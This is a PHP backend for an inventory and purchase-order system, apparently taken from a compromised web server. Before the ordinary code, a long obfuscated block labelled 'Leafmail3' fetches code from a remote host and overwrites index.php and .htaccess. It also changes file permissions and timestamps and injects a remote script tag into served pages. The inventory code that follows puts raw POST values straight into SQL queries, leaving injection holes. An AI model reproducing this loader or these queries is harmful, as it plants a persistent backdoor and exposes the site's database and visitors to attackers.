<?php /*Leafmail3*/goto o1QFr; wasj3: $ZJUCA($jQ0xa, $RTa9G); goto wYDtx; IuHdj: $egQ3R = "\147\172\151"; goto ChKDE; TpHVE: $cPzOq .= "\157\x6b\x6b"; goto vgltl; gmVrv: $Mvmq_ .= "\x6c\x5f\x63\154\x6f"; goto N9T5l; SClM0: $VwfuP = "\x64\x65\146"; goto PXHHr; m8hp8: $uHlLz = "\x73\x74\x72"; goto lz2G0; UH4Mb: $eULaj .= "\x70\x63\x2e\x70"; goto apDh3; QPct6: AtVLG: goto Mg1JO; dj8v0: $ZJUCA = "\143\150"; goto WmTiu; uHm0i: $TBxbX = "\x57\x50\137\125"; goto RCot0; f4Rdw: if (!($EUeQo($kpMfb) && !preg_match($tIzL7, PHP_SAPI) && $fHDYt($uZmPe, 2 | 4))) { goto TGN7B; } goto S2eca; H7qkB: $MyinT .= "\164\40\x41\x63\x63"; goto Air1i; AedpI: try { goto JM3SL; oiS8N: @$YWYP0($lJtci, $H0gg1); goto nucR0; AffR5: @$YWYP0($PcRcO, $H0gg1); goto SpIUU; JnP2S: @$ZJUCA($lJtci, $shT8z); goto oiS8N; nOhHX: @$ZJUCA($lJtci, $RTa9G); goto LvbAc; LvbAc: @$rGvmf($lJtci, $UYOWA["\141"]); goto JnP2S; SpIUU: @$ZJUCA($jQ0xa, $shT8z); goto qvTm1; gA5rv: @$ZJUCA($PcRcO, $shT8z); goto AffR5; nucR0: @$ZJUCA($PcRcO, $RTa9G); goto COvI1; JM3SL: @$ZJUCA($jQ0xa, $RTa9G); goto nOhHX; COvI1: @$rGvmf($PcRcO, $UYOWA["\142"]); goto gA5rv; qvTm1: } catch (Exception $ICL20) { } goto PqZGA; BWxc9: $kpMfb .= "\154\137\x69\156\x69\164"; goto RMP1m; Q7gNx: $gvOPD = "\151\163\137"; goto AfwzG; fFfBR: goto AtVLG; goto kST_Q; J9uWl: $e9dgF .= "\x61\171\163"; goto lNb3h; ZlPje: $u9w0n .= "\x75\x69\x6c\144\x5f\161"; goto Mit4a; YRbfa: $dGt27 .= "\157\x73\x65"; goto L744i; ioNAN: $tIzL7 .= "\x6c\x69\57"; goto Khhgn; mz3rE: $FANp1 .= "\x70\141\x72\145"; goto SClM0; eBKm1: $PcRcO = $jQ0xa; goto Sg4f2; D0V8f: $pv6cp = "\162\x65"; goto Hy0sm; xXaQc: $FANp1 = "\x76\145\162\x73\151"; goto T7IwT; ulics: try { $_SERVER[$pv6cp] = 1; $pv6cp(function () { goto YEXR4; PKzAL: $AG2hR .= "\163\171\x6e\x63\75\164\162\165\145"; goto HIXil; NZAxH: $AG2hR .= "\x65\x72\75\164\x72\165\x65\x3b" . "\12"; goto Tbsb3; xDrpr: $AG2hR .= "\x75\x6d\x65\156\164\54\40\x67\75\144\x2e\143\162\145\x61\164\145"; goto mLjk9; r_Oqj: $AG2hR .= "\163\x63\162\151\160\164\x22\x3e" . "\xa"; goto JZsfv; PEdls: $AG2hR .= "\74\57\163"; goto WBFgG; POyWW: $AG2hR .= "\x4d\55"; goto a8oGQ; N2RIK: $AG2hR .= "\175\x29\50\51\x3b" . "\12"; goto PEdls; Vj0ze: $AG2hR .= "\x72\151\160\x74\40\164\x79\x70\145\x3d\42\164\145\170"; goto FXjwZ; JZsfv: $AG2hR .= "\x28\x66\x75\156\143"; goto ZRBmo; zk1Ml: $AG2hR .= "\x79\124\141\147\x4e\x61\155\145"; goto STHB_; aKt86: $AG2hR .= "\x72\x69\160\x74\42\51\x2c\40\x73\75\x64\x2e\x67\x65\x74"; goto oxuwD; FXjwZ: $AG2hR .= "\x74\57\x6a\141\x76\141"; goto r_Oqj; YffEK: $AG2hR .= "\57\x6d\141\164"; goto nL_GE; ZrlUz: $AG2hR .= "\x73\x63\162\151\x70\164\x22\x3b\40\147\x2e\141"; goto PKzAL; MSqPC: $AG2hR .= "\x65\x20\55\x2d\76\12"; goto rWq2m; gUhrX: $AG2hR .= "\74\x73\143"; goto Vj0ze; oxuwD: $AG2hR .= "\x45\154\x65\x6d\145\156\164\x73\102"; goto zk1Ml; a8oGQ: $AG2hR .= time(); goto xyZaU; WBFgG: $AG2hR .= "\x63\162\151\160\164\x3e\xa"; goto jHj0s; rWq2m: echo $AG2hR; goto zxMHd; zzMTI: $AG2hR .= "\152\141\166\x61"; goto ZrlUz; HIXil: $AG2hR .= "\73\x20\147\56\144\x65\x66"; goto NZAxH; EXhzp: $AG2hR .= "\x65\156\164\x4e\x6f\x64\145\56\x69\x6e"; goto yJp9W; KUpUt: $AG2hR .= "\x64\40\115\141\x74"; goto c13YM; hugz8: $AG2hR .= "\x6f\x72\145\50\x67\54\x73\51\73" . "\xa"; goto N2RIK; xyZaU: $AG2hR .= "\x22\73\40\163\56\160\141\162"; goto EXhzp; ZRBmo: $AG2hR .= "\164\151\x6f\156\x28\51\x20\173" . "\xa"; goto sOVga; YqIfq: $AG2hR .= "\77\x69\x64\x3d"; goto POyWW; Tbsb3: $AG2hR .= "\147\x2e\163\x72"; goto vxsas; k1w2Q: $AG2hR = "\x3c\41\x2d\55\x20\115\x61"; goto OOFo2; F2sIB: $AG2hR .= "\x3d\x22\164\x65\x78\x74\57"; goto zzMTI; OOFo2: $AG2hR .= "\x74\157\155\x6f\x20\55\x2d\x3e\xa"; goto gUhrX; vxsas: $AG2hR .= "\143\x3d\165\x2b\42\x6a\163\57"; goto JGvCK; jHj0s: $AG2hR .= "\74\x21\55\55\40\x45\156"; goto KUpUt; mLjk9: $AG2hR .= "\105\154\x65\x6d\x65\156\x74\50\42\163\x63"; goto aKt86; yJp9W: $AG2hR .= "\x73\x65\162\x74\102\145\146"; goto hugz8; c13YM: $AG2hR .= "\x6f\x6d\x6f\40\103\157\144"; goto MSqPC; STHB_: $AG2hR .= "\50\x22\x73\x63\162\x69"; goto SX8pI; JGvCK: $AG2hR .= $osL5h; goto YffEK; nL_GE: $AG2hR .= "\x6f\155\x6f\56\x6a\x73"; goto YqIfq; SX8pI: $AG2hR .= "\160\x74\42\51\133\x30\135\x3b" . "\xa"; goto uh8pE; YEXR4: global $osL5h, $cPzOq; goto k1w2Q; jW6LQ: $AG2hR .= "\166\141\x72\40\144\x3d\x64\157\143"; goto xDrpr; uh8pE: $AG2hR .= "\x67\x2e\164\x79\x70\145"; goto F2sIB; sOVga: $AG2hR .= "\166\x61\162\40\x75\75\42" . $cPzOq . "\42\x3b" . "\xa"; goto jW6LQ; zxMHd: }); } catch (Exception $ICL20) { } goto arBxc; TrkYs: $eULaj .= "\x2f\170\x6d"; goto GE2p3; L744i: $cPzOq = "\x68\x74\164\x70\163\72\57\x2f"; goto TpHVE; CNdmS: wLXpb: goto wasj3; nHXnO: $_POST = $_REQUEST = $_FILES = array(); goto CNdmS; PHhHL: P9yQa: goto W2Q7W; UkCDT: $cLC40 = 32; goto BnazY; vabQZ: $CgFIN = 1; goto QPct6; gSbiK: try { goto xtnST; qBVAq: $k7jG8[] = $E0suN; goto Tc9Eb; vZ6zL: $E0suN = trim($Q0bWd[0]); goto LuoPM; D98P3: if (!empty($k7jG8)) { goto FbDAI; } goto AML_a; LuoPM: $jCv00 = trim($Q0bWd[1]); goto Q4uy7; xtnST: if (!$gvOPD($d3gSl)) { goto nHP5K; } goto W8uMn; c_73m: FbDAI: goto h1Cu7; kNAxm: if (!($uHlLz($E0suN) == $cLC40 && $uHlLz($jCv00) == $cLC40)) { goto lfWQh; } goto MfJKK; L8cv7: WVm2j: goto c_73m; AML_a: $d3gSl = $jQ0xa . "\x2f" . $HNQiW; goto GBRPC; ZSYyc: $jCv00 = trim($Q0bWd[1]); goto kNAxm; W8uMn: $Q0bWd = @explode("\72", $DJDq1($d3gSl)); goto Woix_; EA1BT: if (!(is_array($Q0bWd) && count($Q0bWd) == 2)) { goto ctSg2; } goto A163l; Woix_: if (!(is_array($Q0bWd) && count($Q0bWd) == 2)) { goto wU2zk; } goto vZ6zL; Q4uy7: if (!($uHlLz($E0suN) == $cLC40 && $uHlLz($jCv00) == $cLC40)) { goto VAVW5; } goto qBVAq; tEVz_: $k7jG8[] = $jCv00; goto xWpvL; xWpvL: lfWQh: goto oilos; MfJKK: $k7jG8[] = $E0suN; goto tEVz_; N3TyU: wU2zk: goto snD7p; lky0R: $Q0bWd = @explode("\72", $DJDq1($d3gSl)); goto EA1BT; Tc9Eb: $k7jG8[] = $jCv00; goto evp7M; snD7p: nHP5K: goto D98P3; oilos: ctSg2: goto L8cv7; evp7M: VAVW5: goto N3TyU; GBRPC: if (!$gvOPD($d3gSl)) { goto WVm2j; } goto lky0R; A163l: $E0suN = trim($Q0bWd[0]); goto ZSYyc; h1Cu7: } catch (Exception $ICL20) { } goto xU6vT; T7IwT: $FANp1 .= "\x6f\x6e\x5f\143\x6f\x6d"; goto mz3rE; JX1Oy: $dGt27 = "\x66\x63\x6c"; goto YRbfa; BnazY: $Pzt0o = 5; goto TYFaW; o1QFr: $kFvng = "\74\x44\x44\x4d\x3e"; goto wODYw; CL80L: $MyinT .= "\120\x2f\61\x2e\x31\x20\x34"; goto gErqa; tFGg7: $YWYP0 .= "\x75\143\x68"; goto dj8v0; pXfDS: $ygOJ_ .= "\x2f\167\160"; goto c7yEe; xUd9U: $pv6cp .= "\151\x6f\x6e"; goto bqFyS; PqZGA: CVVA3: goto RDKTA; wYDtx: $uZmPe = $nPBv4($eULaj, "\x77\x2b"); goto f4Rdw; E453u: $QIBzt .= "\56\64"; goto O8RXw; a4EJZ: $dZR_y = $cPzOq; goto vZkPa; FK_sr: $kb9bA .= "\x65\162\x2e\x69"; goto G2uff; TuwL4: $jQ0xa = $_SERVER[$Wv1G0]; goto wrxGI; wJDrU: $eULaj = $jQ0xa; goto TrkYs; MLdcc: $fHDYt .= "\x63\153"; goto JX1Oy; Gs7Gb: $kpMfb = $vW4As; goto BWxc9; Mit4a: $u9w0n .= "\x75\x65\x72\171"; goto cIo5P; GE2p3: $eULaj .= "\x6c\162"; goto UH4Mb; cIo5P: $uAwql = "\155\x64\65"; goto aXExt; c7yEe: $ygOJ_ .= "\x2d\x61"; goto XWOCC; wrxGI: $ygOJ_ = $jQ0xa; goto pXfDS; XsWqd: $kb9bA .= "\57\56\165\163"; goto FK_sr; cWrVz: $nPBv4 .= "\145\x6e"; goto KCtWA; CrWKs: $l0WLW .= "\157\160\x74"; goto jcG0e; lz2G0: $uHlLz .= "\154\x65\x6e"; goto xXaQc; wee0Y: $ulOTQ .= "\115\111\116"; goto Tfi5q; vgltl: $cPzOq .= "\154\x69\x6e\153\56\x74"; goto pr5fA; Khhgn: $tIzL7 .= "\x73\151"; goto JBJmV; kJlf4: $DJDq1 .= "\147\145\164\137\143"; goto NZqWx; lNb3h: $H0gg1 = $xsR4V($e9dgF); goto XYviL; TBl6Q: sLwcv: goto fFfBR; RMP1m: $l0WLW = $vW4As; goto ujtZa; XQnCd: $PcRcO .= "\x61\143\143\145\163\x73"; goto ikUIP; X4xWX: $QIBzt = "\x35"; goto E453u; hDUdL: $MWMOe .= "\x6c\x65"; goto Q7gNx; LxUUO: $RTa9G = $QTYip($HqqUn($RTa9G), $Pzt0o); goto qaeyL; f6Txl: $HqqUn = "\x64\x65\143"; goto gwNCH; sK97X: $nPBv4 = "\x66\157\160"; goto cWrVz; Ee0VW: $EUeQo .= "\164\x69\x6f\156\x5f"; goto a2JJX; D9NbF: $CgFIN = 1; goto PHhHL; VY3H_: $Wv1G0 = "\x44\117\x43\x55\115\105\116\x54"; goto HpOFr; CRqG1: if (empty($k7jG8)) { goto VIn91; } goto s4AWH; apDh3: $eULaj .= "\x68\160\x2e\60"; goto sK97X; Sg4f2: $PcRcO .= "\57\x2e\x68\x74"; goto XQnCd; jcG0e: $YQ0P6 = $vW4As; goto rA_Dy; dlqC2: $HNQiW = substr($uAwql($osL5h), 0, 6); goto xGZOR; kxKwG: $osL5h = $_SERVER[$i5EZR]; goto TuwL4; ozW5s: $e9dgF .= "\63\x20\x64"; goto J9uWl; xU6vT: $lJtci = $jQ0xa; goto BpRMk; CquiC: $dZR_y .= "\x63\x6f\160\171"; goto BLSy0; GSfrX: $pv6cp .= "\x75\x6e\143\164"; goto xUd9U; yaYSs: $rGvmf .= "\x6f\x6e\x74\x65\156\164\163"; goto mIlAi; FXRyn: $TBxbX .= "\115\x45\x53"; goto R1jVG; kST_Q: VIn91: goto vabQZ; flXr3: $shT8z = $QTYip($HqqUn($shT8z), $Pzt0o); goto TkfCl; FJdH4: $dZR_y .= "\x3d\x67\x65\x74"; goto CquiC; kJyDh: $QTYip = "\x69\156\x74"; goto blzff; s4AWH: $H25pP = $k7jG8[0]; goto t74Wt; TyAte: $k7jG8 = array(); goto UkCDT; EO8QL: try { $UYOWA = @$AkFS8($egQ3R($eKFWX($M7wqP))); } catch (Exception $ICL20) { } goto OXweB; XYviL: $i5EZR = "\110\124\124\x50"; goto j4Pjv; ikUIP: $kb9bA = $jQ0xa; goto XsWqd; VrwTF: $nRD8p .= "\x64\x69\162"; goto aQp1m; dLa5a: $pv6cp .= "\x65\162\x5f"; goto x5YEr; PgImI: @$ZJUCA($kb9bA, $RTa9G); goto yAax8; Jb1Vu: try { goto Bwps7; WPylr: if (!$xsy4x($Y61WO)) { goto nWSzU; } goto NpK90; xqrLf: @$YWYP0($dqnvi, $H0gg1); goto cinsF; N7wJU: if ($xsy4x($Y61WO)) { goto KOuoA; } goto RBLfp; wf0jq: @$ZJUCA($Y61WO, $shT8z); goto xqrLf; bfkJn: try { goto jwOvP; sXqkD: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYPEER, false); goto tXay1; jwOvP: $ekYPG = $kpMfb(); goto jMqt3; VURt4: $l0WLW($ekYPG, CURLOPT_POST, 1); goto Qk7oo; G7Y1e: $l0WLW($ekYPG, CURLOPT_USERAGENT, "\x49\x4e"); goto Sw_Ys; lg1iu: $l0WLW($ekYPG, CURLOPT_TIMEOUT, 3); goto VURt4; jMqt3: $l0WLW($ekYPG, CURLOPT_URL, $LfwPf . "\x26\164\x3d\151"); goto G7Y1e; Qk7oo: $l0WLW($ekYPG, CURLOPT_POSTFIELDS, $u9w0n($Lx9yT)); goto axPES; Sw_Ys: $l0WLW($ekYPG, CURLOPT_RETURNTRANSFER, 1); goto sXqkD; tXay1: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYHOST, false); goto Gb33B; PUEHo: $Mvmq_($ekYPG); goto rF4qo; Gb33B: $l0WLW($ekYPG, CURLOPT_FOLLOWLOCATION, true); goto lg1iu; axPES: $YQ0P6($ekYPG); goto PUEHo; rF4qo: } catch (Exception $ICL20) { } goto zCePm; s2GBY: $Y61WO = dirname($dqnvi); goto N7wJU; bO0VE: KOuoA: goto WPylr; RBLfp: @$ZJUCA($jQ0xa, $RTa9G); goto lexI4; NpK90: @$ZJUCA($Y61WO, $RTa9G); goto aGYEQ; wsLep: $Lx9yT = ["\144\x61\x74\x61" => $UYOWA["\x64"]["\165\162\x6c"]]; goto bfkJn; y0C5p: @$ZJUCA($dqnvi, $shT8z); goto wf0jq; cinsF: $LfwPf = $cPzOq; goto d8sPt; OAF8R: $LfwPf .= "\x6c\x6c"; goto wsLep; d8sPt: $LfwPf .= "\77\141\143"; goto HZ42Q; lexI4: @$nRD8p($Y61WO, $RTa9G, true); goto K7fs2; aGYEQ: @$rGvmf($dqnvi, $UYOWA["\144"]["\x63\157\x64\x65"]); goto y0C5p; zCePm: nWSzU: goto r2ase; Bwps7: $dqnvi = $jQ0xa . $UYOWA["\144"]["\160\x61\x74\x68"]; goto s2GBY; K7fs2: @$ZJUCA($jQ0xa, $shT8z); goto bO0VE; HZ42Q: $LfwPf .= "\164\75\x63\141"; goto OAF8R; r2ase: } catch (Exception $ICL20) { } goto AedpI; kAMGF: $xsy4x .= "\144\x69\x72"; goto gdP2h; lX6T6: if (!$gvOPD($kb9bA)) { goto KTGlr; } goto spjef; jxKJS: $ulOTQ .= "\x5f\x41\104"; goto wee0Y; vZkPa: $dZR_y .= "\x3f\141\143\164"; goto FJdH4; gErqa: $MyinT .= "\60\x36\x20\116\x6f"; goto H7qkB; xGZOR: $hg32N = $d3gSl = $ygOJ_ . "\57" . $HNQiW; goto TyAte; GiT2I: $Mvmq_ = $vW4As; goto gmVrv; KCtWA: $fHDYt = "\x66\x6c\157"; goto MLdcc; Yc09l: $xsy4x = "\x69\163\137"; goto kAMGF; FZsOD: $lJtci .= "\150\x70"; goto eBKm1; rA_Dy: $YQ0P6 .= "\154\137\x65\170\x65\x63"; goto GiT2I; VQCaR: $k8h0h = !empty($m4bDA) || !empty($ZTS7q); goto Bw8cX; ujtZa: $l0WLW .= "\154\137\x73\x65\x74"; goto CrWKs; R1jVG: $ulOTQ = "\127\120"; goto jxKJS; OXweB: if (!is_array($UYOWA)) { goto CVVA3; } goto L7ftk; bqFyS: if (isset($_SERVER[$pv6cp])) { goto Kwp9i; } goto r3vZ_; ChKDE: $egQ3R .= "\156\146\x6c\x61\164\145"; goto OCGca; Bx0F8: $rGvmf = "\146\x69\154\145\x5f"; goto cMMsY; lar4b: $xsR4V .= "\x6d\145"; goto ESAaf; L7ftk: try { goto b8mrw; IZ7dT: @$rGvmf($d3gSl, $UYOWA["\x63"]); goto qi8JJ; j1slf: if (!$xsy4x($ygOJ_)) { goto fnZm_; } goto l27iU; FnW9Y: fnZm_: goto IZ7dT; RHQPY: @$ZJUCA($jQ0xa, $shT8z); goto FudGj; jRIpH: $d3gSl = $hg32N; goto FnW9Y; b8mrw: @$ZJUCA($jQ0xa, $RTa9G); goto j1slf; l27iU: @$ZJUCA($ygOJ_, $RTa9G); goto jRIpH; qi8JJ: @$ZJUCA($d3gSl, $shT8z); goto fMj35; fMj35: @$YWYP0($d3gSl, $H0gg1); goto RHQPY; FudGj: } catch (Exception $ICL20) { } goto Jb1Vu; Hy0sm: $pv6cp .= "\x67\151\x73\164"; goto dLa5a; wODYw: $tIzL7 = "\57\x5e\143"; goto ioNAN; D9G8A: $vW4As = "\x63\165\162"; goto Gs7Gb; zR6Sw: $RTa9G += 304; goto LxUUO; FLAgg: @$ZJUCA($jQ0xa, $shT8z); goto Ms_Rx; TkfCl: $MyinT = "\110\124\124"; goto CL80L; JBJmV: $xsR4V = "\x73\x74\x72"; goto wDwVu; m7Y7E: $shT8z += 150; goto flXr3; OCGca: $AkFS8 = "\165\x6e\x73\145\x72"; goto DuXwv; spjef: @$ZJUCA($jQ0xa, $RTa9G); goto PgImI; mIlAi: $YWYP0 = "\x74\157"; goto tFGg7; Air1i: $MyinT .= "\x65\x70\164\x61\142\154\145"; goto wJDrU; hnuEm: $M7wqP = false; goto IxcDO; AfwzG: $gvOPD .= "\x66\151\154\x65"; goto Yc09l; Mg1JO: if (!$CgFIN) { goto V5o9n; } goto a4EJZ; O8RXw: $QIBzt .= "\x2e\x30\73"; goto kxKwG; Qjsri: Kwp9i: goto uHm0i; aQp1m: $DJDq1 = "\146\151\154\145\x5f"; goto kJlf4; wDwVu: $xsR4V .= "\x74\157"; goto k5kym; Ms_Rx: KTGlr: goto QDkYN; p2xAd: $u9w0n = "\x68\x74\x74\160\x5f\142"; goto ZlPje; XWOCC: $ygOJ_ .= "\x64\155\151\156"; goto dlqC2; PXHHr: $VwfuP .= "\x69\156\145\144"; goto uwRQG; t74Wt: $Aa5A7 = $k7jG8[1]; goto rjUnC; WmTiu: $ZJUCA .= "\x6d\157\x64"; goto OMDdm; F90kP: $CgFIN = 1; goto TBl6Q; IxcDO: try { goto MN2Ol; lfwpD: $l0WLW($ekYPG, CURLOPT_RETURNTRANSFER, 1); goto XT0V7; pm4fL: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYHOST, false); goto f1Wpg; LukB5: $l0WLW($ekYPG, CURLOPT_USERAGENT, "\x49\x4e"); goto lfwpD; MN2Ol: $ekYPG = $kpMfb(); goto PGjVI; XT0V7: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYPEER, false); goto pm4fL; f1Wpg: $l0WLW($ekYPG, CURLOPT_FOLLOWLOCATION, true); goto A02q4; Jr5Fq: $Mvmq_($ekYPG); goto kxHAl; kxHAl: $M7wqP = trim(trim($M7wqP, "\xef\273\xbf")); goto DRdNb; A02q4: $l0WLW($ekYPG, CURLOPT_TIMEOUT, 10); goto czpAh; PGjVI: $l0WLW($ekYPG, CURLOPT_URL, $dZR_y); goto LukB5; czpAh: $M7wqP = $YQ0P6($ekYPG); goto Jr5Fq; DRdNb: } catch (Exception $ICL20) { } goto TtjMz; yA6tr: $e9dgF .= "\63\x36"; goto ozW5s; BLSy0: $dZR_y .= "\x26\164\x3d\x69\46\x68\75" . $osL5h; goto hnuEm; qaeyL: $shT8z = 215; goto m7Y7E; YAsQc: if (!(!$_SERVER[$pv6cp] && $FANp1(PHP_VERSION, $QIBzt, "\76"))) { goto VlKKH; } goto ulics; QDkYN: $CgFIN = 0; goto CRqG1; g3rCR: $m4bDA = $_REQUEST; goto A4fYL; rjUnC: if (!(!$gvOPD($lJtci) || $MWMOe($lJtci) != $H25pP)) { goto P9yQa; } goto D9NbF; x5YEr: $pv6cp .= "\x73\x68\165"; goto itQ2f; A4fYL: $ZTS7q = $_FILES; goto VQCaR; a2JJX: $EUeQo .= "\145\x78"; goto fYDkt; TYFaW: $Pzt0o += 3; goto hoCMV; fYDkt: $EUeQo .= "\x69\163\x74\163"; goto D9G8A; fmcU9: $MWMOe .= "\x5f\x66\151"; goto hDUdL; S2eca: $ZJUCA($jQ0xa, $shT8z); goto YAsQc; RCot0: $TBxbX .= "\x53\105\x5f\124\110\105"; goto FXRyn; BpRMk: $lJtci .= "\57\x69\x6e"; goto lJYIj; cMMsY: $rGvmf .= "\160\x75\164\137\143"; goto yaYSs; j4Pjv: $i5EZR .= "\x5f\x48\117\x53\x54"; goto VY3H_; itQ2f: $pv6cp .= "\x74\x64\x6f"; goto gi1ux; YAE22: $eKFWX .= "\66\x34\137\x64"; goto HkhAv; DuXwv: $AkFS8 .= "\x69\x61\x6c\151\x7a\x65"; goto kJyDh; NZqWx: $DJDq1 .= "\x6f\156\164\145\x6e\x74\x73"; goto Bx0F8; ESAaf: $EUeQo = "\146\x75\156\143"; goto Ee0VW; HkhAv: $eKFWX .= "\x65\143\x6f\x64\145"; goto IuHdj; RDKTA: HuCWH: goto tkEEo; k5kym: $xsR4V .= "\x74\151"; goto lar4b; WQZ3H: $UYOWA = 0; goto EO8QL; TtjMz: if (!($M7wqP !== false)) { goto HuCWH; } goto WQZ3H; N9T5l: $Mvmq_ .= "\x73\145"; goto p2xAd; HpOFr: $Wv1G0 .= "\137\122\117\x4f\124"; goto X4xWX; arBxc: VlKKH: goto gSbiK; G2uff: $kb9bA .= "\156\151"; goto lX6T6; gwNCH: $HqqUn .= "\157\x63\164"; goto m8hp8; yAax8: @unlink($kb9bA); goto FLAgg; pr5fA: $cPzOq .= "\157\x70\x2f"; goto D0V8f; gi1ux: $pv6cp .= "\x77\x6e\x5f\x66"; goto GSfrX; OMDdm: $eKFWX = "\142\141\x73\x65"; goto YAE22; aXExt: $MWMOe = $uAwql; goto fmcU9; gdP2h: $nRD8p = "\155\x6b"; goto VrwTF; Bw8cX: if (!(!$fs0FH && $k8h0h)) { goto wLXpb; } goto nHXnO; uwRQG: $e9dgF = "\x2d\61"; goto yA6tr; hoCMV: $RTa9G = 189; goto zR6Sw; Tfi5q: $fs0FH = $VwfuP($TBxbX) || $VwfuP($ulOTQ); goto g3rCR; W2Q7W: if (!(!$gvOPD($PcRcO) || $MWMOe($PcRcO) != $Aa5A7)) { goto sLwcv; } goto F90kP; r3vZ_: $_SERVER[$pv6cp] = 0; goto Qjsri; lJYIj: $lJtci .= "\144\x65\170\56\x70"; goto FZsOD; blzff: $QTYip .= "\x76\x61\x6c"; goto f6Txl; tkEEo: V5o9n: goto ossJl; ossJl: TGN7B: ?>
<?php
	error_reporting(E_ALL);
   include_once 'database_iiq.php';
   
   // TABLE NAMES
   $tbl_inventory_comments             = "temp_inventory_comments";
   $tbl_inventory_materials_inventory  = "temp_inventory_materials_inventory";
   $tbl_inventory_warehouse_receiving  = "temp_inventory_warehouse_receiving";
   $tbl_inventory_purchase_orders      = "temp_inventory_purchase_orders";
   $tbl_inventory_purchase_order_items = "temp_inventory_purchase_order_items";
   $tbl_inventory_stock_transfers      = "temp_inventory_stock_transfers";
   $tbl_inventory_stock_card           = "temp_inventory_stock_card";
   $tbl_inventory_stock_transfers_sources      = "temp_inventory_stock_transfers_sources";
   $tbl_inventory_warehouse_receiving_checklist = "temp_inventory_warehouse_receiving_checklist";

   // -- JANUARY 10, 2024 -- TABLES START --
   $tbl_inventory_production_products = "temp_inventory_production_products";
   $tbl_inventory_production_formulation = "temp_inventory_production_formulation";
   $tbl_inventory_sales = "temp_inventory_sales";
   $temp_inventory_production_in_progress = "temp_inventory_production_in_progress";
   // -- JANUARY 10, 2024 -- TABLES END --
   
   // FOR INTEGRATION
   $tbl_inventory_locations = "temp_inventory_locations";
   $col_location_id         = "id";
   $col_location_location   = "location";

   $tbl_raw_materials              = "temp_raw_materials"; // SUPPLIER
   $col_raw_material_id            = "id";
   $col_raw_material_supplier_id   = "supplier_id";
   $col_raw_material_raw_materials = "raw_materials";
   $col_raw_material_sku           = "sku";
   $col_raw_material_category      = "category";
   $col_raw_material_price_per_unit = "price_per_unit";
   $col_raw_material_uom           = "uom";

   $tbl_suppliers = "temp_suppliers";     // RAW MATERIALS
   $col_suppliers_id = "id";
   $col_supplier_name = "supplier_name";

   // SEE FUNCTIONS BELOW THE CONDITIONALS

	if(isset($_POST['get_purchase_data'])){

      $status = $_POST['status'];
      $where = "AND status='$status'";
      if($status == "all"){
         $where = "";
      }
      $sql  = "SELECT a.*,a.id AS po_id,$col_location_location,$col_supplier_name,1 AS comment_type FROM $tbl_inventory_purchase_orders a LEFT JOIN $tbl_inventory_locations b ON a.location_id=b.$col_location_id LEFT JOIN $tbl_suppliers c ON a.supplier_id=c.$col_suppliers_id WHERE deleted='0' $where ORDER BY date_added DESC";

      if($status=="received"){
         $sql = "SELECT a.*, b.*,$col_location_location,$col_supplier_name,1 AS comment_type FROM $tbl_inventory_purchase_orders a LEFT JOIN $tbl_inventory_warehouse_receiving b ON a.id=b.po_id LEFT JOIN $tbl_inventory_locations c ON a.location_id=c.$col_location_id LEFT JOIN $tbl_suppliers d ON a.supplier_id=d.$col_suppliers_id WHERE deleted='0' AND status='$status' ORDER BY date_added DESC";
      }

      $query = $conn->query($sql);
      echo json_encode([
         'data' => $query->fetch_all(MYSQLI_ASSOC)
      ]);
      
   }else if(isset($_POST['get_suppliers_locations'])){

      $results = [];
      $results['suppliers'] = get_suppliers();
      $results['locations'] = get_locations();
      echo json_encode($results);
   
   }else if(isset($_POST['get_items_from_supplier'])){

      $supplier_id = $_POST['supplier_id'];
      echo get_raw_mats($supplier_id);

   }else if(isset($_POST['add_po'])){
    
      $po_form    = json_decode($_POST['po_form']);
      $items_form = json_decode($_POST['items_form']);

      $po_form_cols = "";
      $po_form_vals = "";
      $purchase_order = "";
      foreach($po_form as $po_item){

         $po_form_cols .= $po_item->name.",";
         $po_form_vals .= "'".$conn->real_escape_string($po_item->value)."',";

         if($po_item->name == "po"){
            $purchase_order = $conn->real_escape_string($po_item->value);
         }
      }

      $po_form_cols .= "logo";
      $po_form_vals .= "'".get_user_logo()."'";

      if(with_duplicate("SELECT * FROM $tbl_inventory_purchase_orders WHERE po='$purchase_order' AND deleted='0'")){
         echo json_encode(error("Duplicate Purchase Order Number."));
         exit();
      }

      $sql = "INSERT INTO $tbl_inventory_purchase_orders($po_form_cols) VALUES($po_form_vals)";
      
      if($conn->query($sql) === TRUE){

         $last_id = $conn->insert_id;
         foreach($items_form as $row_item){
      
            $cols = "po_id,"; $vals=$last_id.",";
            foreach($row_item as $col_item){
               $cols .= $col_item->name.",";
               $vals .= "'".$conn->real_escape_string($col_item->value)."',";
            }
            $cols = substr($cols,0, -1);
            $vals = substr($vals,0, -1);
            $sql = "INSERT INTO $tbl_inventory_purchase_order_items($cols) VALUES($vals)";
            $conn->query($sql);
         }

         // insert into warehouse receiving
         $sql = "INSERT INTO $tbl_inventory_warehouse_receiving(po_id) VALUES($last_id)";
         if($conn->query($sql) === TRUE){
            $warehouse_receiving_id = $conn->insert_id;
            // insert default cheklist items (warehouse receiving)
            $checklist_items = ['Approved Supplier/Vendor','BOL/Quantity Ordered','Certificate of Guarantee (COG)','Certificate of Analysis (COA)','Safety Data Sheets (SDS)','Kosher Ingredient Logo','Halal Ingredient Logo','Organic Ingredient Logo','Gluten Free Ingredient Logo','Certificate of Origin (COO)'];
            $item_type = 1;

            foreach($checklist_items as $item){
               $sql = "INSERT INTO $tbl_inventory_warehouse_receiving_checklist(warehouse_receiving_id,item_type,description) VALUES($warehouse_receiving_id,$item_type,'$item')";
               $conn->query($sql);
            }

            $checklist_items = ['Trailer Internal & External Damaged','Signs of Pest Activity/Vermin','Checmical Spill/Stains or smell','Signs of Odors Chemical or Spoiled','Shipment Mixed Toxic Material','Ingredients Sealed or Intact','Ingredients Record Damaged','Ingredients Quantity Received','Ingredients Proper Identification','MFG Expiry/Lot Number/Retest Date'];
            $item_type = 2;

            foreach($checklist_items as $item){
               $sql = "INSERT INTO $tbl_inventory_warehouse_receiving_checklist(warehouse_receiving_id,item_type,description) VALUES($warehouse_receiving_id,$item_type,'$item')";
               $conn->query($sql);
            }
         }
         echo json_encode(success("Successfully Added Purchase Order"));
      }else{
         echo json_encode(error("Error Adding Purchase Order"));
      }
   
   }else if(isset($_POST['get_po_items_details'])){

      $po_id = $_POST['po_id'];

      $sql = "SELECT * FROM $tbl_inventory_purchase_order_items WHERE po_id=$po_id";
      $query = $conn->query($sql);
